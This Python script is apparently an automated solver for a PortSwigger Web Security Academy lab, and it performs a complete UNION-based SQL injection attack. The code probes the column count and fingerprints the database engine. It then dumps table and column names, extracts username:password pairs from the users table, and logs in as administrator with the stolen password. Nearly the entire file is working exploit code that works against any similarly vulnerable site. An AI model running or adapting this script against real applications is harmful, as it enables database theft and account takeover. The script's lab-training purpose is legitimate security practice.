import sys
import warnings
from typing import List, Optional
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", message="Unverified HTTPS")


class LabExploit:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        self.db_engine = "generic"
        self.is_oracle = False

    def send_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
    ) -> Optional[requests.Response]:
        """Hanldes all low-level HTTP communication"""
        target_url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method,
                target_url,
                params=params,
                data=data,
                timeout=(2, 5),
                allow_redirects=True,
                proxies=self.proxies,
                verify=False,
            )
        except requests.RequestException as e:
            print(f"[-] Connection error: {e}")
            return None

    def validated_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
        stage: str = "unknown",
    ) -> requests.Response:
        """Wrapper gracefully exits in unexpected error"""
        res = self.send_request(endpoint, params, data, method)
        if res is None:
            print(f"[-] State [{stage}]: Connection error")
            sys.exit(1)
        elif res.status_code != 200:
            print(f"[-] Stage [{stage}]: Received HTTP {res.status_code}!")
            print(f"[*] Failed Payload context: {params or data}")
            sys.exit(1)
        return res

    def is_alive(self) -> bool:
        print("[*] Phase 1: Checking if URL is alive...")
        res = self.send_request("")
        return res is not None and "academyLabHeader" in res.text

    def harvest_category(self) -> Optional[str]:
        print("[*] Phase 2: Harvesting valid filter categories...")
        res = self.validated_request("", stage="recon")
        soup = BeautifulSoup(res.text, "html.parser")
        categories = []
        for tag in soup.find_all("a", class_="filter-category"):
            name = tag.get_text(strip=True)
            if "All" not in name:
                categories.append(name)
        return min(categories, key=len) if categories else None

    def find_column_count(self, category: str) -> int:
        print("[*] Phase 3: Determining column count...")

        for i in range(1, 11):
            payload = f"{category}' ORDER BY {i} -- "
            res = self.send_request("filter", params={"category": payload})
            if res is not None and res.status_code != 200:
                return i - 1
        return 0

    def find_string_column(self, category: str, count: int) -> List[int]:
        print("[*] Phase 4: Mapping string-compatible columns & detecting Oracle...")
        # Oracle detection
        nulls = ["NULL"] * count
        payload = f"{category}' UNION SELECT {','.join(nulls)} FROM DUAL -- "
        oracle_test = self.send_request("filter", params={"category": payload})
        if oracle_test is not None and oracle_test.status_code == 200:
            self.is_oracle = True
            self.db_engine = "oracle"
            print("[+] Oracle detected (FROM DUAL requirement active)")
        # Map string-compatible columns
        indices = []
        suffix = "FROM DUAL" if self.db_engine == "oracle" else ""
        for i in range(count):
            cols = ["NULL"] * count
            cols[i] = "'asif_probe'"
            payload = f"{category}' UNION SELECT {','.join(cols)} {suffix} -- "
            res = self.send_request("filter", params={"category": payload})
            if res is not None and "asif_probe" in res.text:
                indices.append(i)
        return indices

    def extract_data(self, html_content: str) -> List[str]:
        """Universal parser for reflected UNION results"""
        headers = []
        soup = BeautifulSoup(html_content, "html.parser")
        # Results reflected in <th> tags within product table
        # Since, we are doing this in first index, <td> is not present
        for th in soup.find_all("th"):
            td = th.find_next_sibling("td")
            if td:
                continue
            headers.append(th.get_text(strip=True))
        return headers

    def detect_db_engine(self, category: str, count: int, indices: List[int]) -> bool:
        print("[*] Phase 5: Fingerprinting Database Engine...")

        probes = {
            "postgresql": "version()",
            "mysql_mssql": "@@version",
            "oracle": "banner FROM v$version",
        }

        for engine, func in probes.items():
            cols = ["NULL"] * count
            cols[indices[0]] = func
            suffix = "FROM DUAL" if engine == "oracle" else ""
            payload = f"{category}' UNION SELECT {','.join(cols)} {suffix} -- "
            res = self.send_request("filter", params={"category": payload})
            if res and res.status_code == 200:
                self.db_engine = engine
                print(f"[+] Database Engine confirmed: {engine.upper()}")
                engine_version = self.extract_data(res.text)
                print(f"[+] Database Engine version: {engine_version[0]}")
                return True
        return False

    def dump_credentials(
        self, category: str, col_count: int, col_indices: List[int]
    ) -> dict[str, str]:
        print("[*] Phase 6: Dumping Schema & Credentials...")
        # Determine table and column registry information
        table_reg = "all_tables" if self.is_oracle else "information_schema.tables"
        col_reg = "all_tab_columns" if self.is_oracle else "information_schema.columns"

        # 1. Extract User Table
        cols = ["NULL"] * col_count
        cols[col_indices[0]] = "table_name"
        payload = f"{category}' UNION SELECT {','.join(cols)} FROM {table_reg} -- "
        res = self.validated_request(
            "filter", params={"category": payload}, stage="table_dump"
        )
        tables = self.extract_data(res.text)
        user_table = next((t for t in tables if "users" in t.lower()), None)

        if not user_table:
            print("[-] Error: Could not find user tavle")
            sys.exit(1)
        print(f"[+] identified user table: {user_table}")

        # 2. Extract Columns
        cols[col_indices[0]] = "column_name"
        where_clause = (
            f"WHERE table_name='{user_table.upper() if self.is_oracle else user_table}'"
        )
        payload = (
            f"{category}' UNION SELECT {','.join(cols)} FROM {col_reg} {where_clause} -- "
        )
        res = self.validated_request(
            "filter", params={"category": payload}, stage="column_name"
        )
        columns = self.extract_data(res.text)
        u_col = next((c for c in columns if "username" in c.lower()), None)
        p_col = next((c for c in columns if "password" in c.lower()), None)

        if not u_col or not p_col:
            print(f"[-] Error: Could not find credential columns in {user_table}")
            sys.exit(1)

        # 3. Extract Credentials
        cols[col_indices[0]] = f"{u_col} || ':' || {p_col}"
        payload = f"{category}' UNION SELECT {','.join(cols)} FROM {user_table} -- "
        res = self.validated_request(
            "filter", params={"category": payload}, stage="creds_dump"
        )
        raw_creds = self.extract_data(res.text)

        if not raw_creds:
            print(f"[-] Error: Could not dump credentials from {user_table}")
            sys.exit(1)

        creds_dict = {}
        for line in raw_creds:
            u, p = line.split(":", 1)
            creds_dict[u.strip()] = p.strip()
        return creds_dict

    def extract_crsf_token(self, html_content: str) -> str:
        csrf_token = ""
        soup = BeautifulSoup(html_content, "html.parser")

        csrf_tag = soup.find("input", attrs={"name": "csrf"})
        if csrf_tag:
            csrf_token = str(csrf_tag.get("value", ""))
        return csrf_token

    def login_as_admin(self, admin_pass: str) -> bool:
        print(
            f"[*] Phase 7: Attempting login for 'administrator' with password: {admin_pass}..."
        )

        # 1. Load login page and extract CSRF token
        res = self.validated_request("login", stage="login_page_load")
        csrf_token = self.extract_crsf_token(res.text)

        if not csrf_token:
            print("[-] Error: Could not find CSRF token in login page")
            sys.exit(1)

        print(f"[+] Extracted CSRF Token: {csrf_token}")

        login_data = {
            "csrf": csrf_token,
            "username": "administrator",
            "password": admin_pass,
        }
        res = self.send_request("login", data=login_data, method="POST")

        # Check Final State
        res = self.send_request("")
        if res is not None and "Congratulation" in res.text:
            return True
        return False

    def solve(self):
        # Check if Lab URL is still active
        if not self.is_alive():
            print("[-] The PortSwigger Lab URL is nto reacherable or has expired!")
            return

        # Extract categories
        category = self.harvest_category()
        if not category:
            print("[-] Could not find a valid category.")
            return
        print(f"[+] Target category identified: {category}.")

        # Determine column count
        col_count = self.find_column_count(category)
        if col_count == 0:
            print("[-] Could not determine column count.")
            return
        print(f"[+] Column count: {col_count}.")

        # Map string-compatible column
        col_indices = self.find_string_column(category, col_count)
        if not col_indices:
            print("[-] Need atleast one string-compatible column!")
            return

        # Fingerprint DB Engine
        engine = self.detect_db_engine(category, col_count, col_indices)
        if not engine:
            print("[-] Could not fingerprint DB!")
            return

        # Dump DB and extract administrator creds
        creds = self.dump_credentials(category, col_count, col_indices)
        if not creds:
            print("[-] Could not dump administrator credentials")
            return

        if self.login_as_admin(creds["administrator"]):
            print("[!] SUCCESS: Lab Solved!")
        else:
            print("[-] Lab failed!")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} https://lab-id.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].strip()
    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
